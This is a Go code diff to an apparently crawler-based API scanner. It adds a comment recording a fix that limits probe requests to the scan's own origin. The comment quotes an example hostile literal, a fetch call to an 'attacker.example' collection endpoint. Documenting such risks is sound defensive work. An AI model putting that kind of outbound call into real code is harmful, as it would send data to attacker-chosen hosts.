@@ -265,6 +265,15 @@ func (c *RESTClassifier) ClassifyDetail(req crawl.ObservedRequest) (bool, float6
 // concat/service-prefix combinatorial reconstruction. Do not extend the
 // concat reached-filter supersession to plain static:js literals without
 // revisiting this reasoning.
+//
+// SEC-BE-001: floored candidates were originally handed to pkg/probe with no
+// origin check, so a hostile bundle literal carrying an attacker-controlled
+// absolute URL (e.g. fetch("https://attacker.example/api/collect")) could
+// reach exactly this floor and get probed — an outbound request to a
+// public, attacker-chosen host. The probe stage now gates every probe target
+// on the scan's own origin (internal/pipeline, composed onto
+// probe.Config.URLValidator), so a cross-origin candidate promoted by this
+// floor is skipped before any request is made, regardless of confidence.
 func staticJSFloor(req crawl.ObservedRequest, pathIsAPI bool, confidence float64, reason string) (float64, string) {
 	if pathIsAPI && confidence < StaticJSConfidence && crawl.IsJSStaticSource(req.Source) {
 		confidence = StaticJSConfidence
